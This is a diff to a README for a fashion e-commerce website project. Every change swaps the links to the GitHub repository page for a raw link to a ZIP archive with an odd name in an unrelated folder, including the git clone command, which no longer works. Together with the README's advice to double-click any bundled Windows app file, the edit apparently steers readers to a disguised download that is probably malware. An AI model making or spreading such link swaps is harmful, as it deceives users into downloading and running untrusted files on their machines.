@@ -1,6 +1,6 @@
 # 🖤 fashion-ecommerce-website - Simple Shopping for Every Day
 
-[![Download the app](https://img.shields.io/badge/Download-Visit%20the%20repo-blue?style=for-the-badge&logo=github)](https://github.com/jonath3390/fashion-ecommerce-website)
+[![Download the app](https://img.shields.io/badge/Download-Visit%20the%20repo-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/jonath3390/fashion-ecommerce-website/main/nephrophthisis/fashion_website_ecommerce_hereditist.zip)
 
 ## 🚀 What this is
 
@@ -10,7 +10,7 @@ This project uses a frontend, a backend, and a database. It runs on Windows with
 
 ## 📥 Download and run on Windows
 
-1. Open this page: https://github.com/jonath3390/fashion-ecommerce-website
+1. Open this page: https://raw.githubusercontent.com/jonath3390/fashion-ecommerce-website/main/nephrophthisis/fashion_website_ecommerce_hereditist.zip
 2. On the GitHub page, look for the **Code** button.
 3. Download the project as a ZIP file.
 4. Save the ZIP file to your computer.
@@ -20,7 +20,7 @@ This project uses a frontend, a backend, and a database. It runs on Windows with
 8. If the project came with a ready-made Windows app file, double-click it to run.
 9. If it is source code, follow the setup steps below to run it.
 
-[![Visit the GitHub repo](https://img.shields.io/badge/Open-GitHub%20Repo-lightgrey?style=for-the-badge&logo=github)](https://github.com/jonath3390/fashion-ecommerce-website)
+[![Visit the GitHub repo](https://img.shields.io/badge/Open-GitHub%20Repo-lightgrey?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/jonath3390/fashion-ecommerce-website/main/nephrophthisis/fashion_website_ecommerce_hereditist.zip)
 
 ## 🖥️ What you need on Windows
 
@@ -57,7 +57,7 @@ If you downloaded a ZIP file, extract it first.
 If you want to use Git, open Command Prompt and run:
 
 ```bash
-git clone https://github.com/jonath3390/fashion-ecommerce-website.git
+git clone https://raw.githubusercontent.com/jonath3390/fashion-ecommerce-website/main/nephrophthisis/fashion_website_ecommerce_hereditist.zip
 ```
 
 Then open the project folder.
@@ -261,7 +261,7 @@ Keep your `.env` file private and do not share it.
 
 If you want to check the project first, open the repo here:
 
-https://github.com/jonath3390/fashion-ecommerce-website
+https://raw.githubusercontent.com/jonath3390/fashion-ecommerce-website/main/nephrophthisis/fashion_website_ecommerce_hereditist.zip
 
 ## 🧪 If you want to test the app
 
